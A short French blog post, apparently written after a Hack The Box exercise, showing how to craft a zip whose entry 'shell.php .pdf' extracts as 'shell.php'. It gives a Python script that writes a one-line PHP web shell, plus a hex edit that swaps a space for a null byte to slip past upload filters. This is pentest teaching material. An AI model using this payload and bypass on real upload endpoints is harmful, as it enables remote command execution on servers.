---
title: Décompresser un zip avec une extension différente pour les fichiers.
img_path: "/assets/img/posts/file_zip_upload_with_different_name"
---

## Introduction

> À l'occasion de la résolution d'une machine hack the box, une incompréhension de ma part à propos d'un payload a mené à la "découverte" d'une chose plutôt rigolote et qui pourrait s'avérer utile dans certain cas précis : avoir une archive zip où, un fichier nommé par exemple `shell.php. pdf`se transforme en `shell.php` à la décompression.

### Comment ça se passe

Pour faire synthétique, voici la procédure : 

- 1) Créer un fichier zip via python (script de hacktricks) :

```python
import zipfile
from io import BytesIO

def create_zip():
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('shell.php .pdf', '<?php echo system($_REQUEST["cmd"]); ?>')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close()

create_zip()
```

> On remarque que le nom a un espace  entre `php` et `pdf`.

- 2) Editer le fichier zip avec une éditeur héxadécimal. Remplacer l'octet `20` par `00` du nom du fichier placé dans le *[Central Directory Header](https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html)*.

```hex
# avant le changement du nom dans le  Central Directory header
00000080: 0000 0073 6865 6c6c 2e70 6870 202e 7064  ...shell.php .pd
# après le changement du nom dans le the Central Directory header
00000080: 0000 0073 6865 6c6c 2e70 6870 002e 7064  ...shell.php..pd
```

- 3) Profit :

![Proof of concept du tricks](poc.png)

### Dans quels cas c'est utile ?

De ce que je peux supputer, c'est utile si l'application ne checke pas la conformité entre le nom du fichier et ce qui est effectivement décompressé. Si l'application ne teste que le *local file name*,  c'est une bonne indication pour au moins tester cette petite technique.

On peut la retrouver dans hacktrick [ici](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/file-upload.md#decompress-with-a-different-name) \o/
 *


* À l'heure actuelle le script original ne fonctionne qu'avec python ou python2.7... Une PR a été faite afin de rendre le script compatible avec python2.7 et python3, en reprenant le code original de hacktricks.
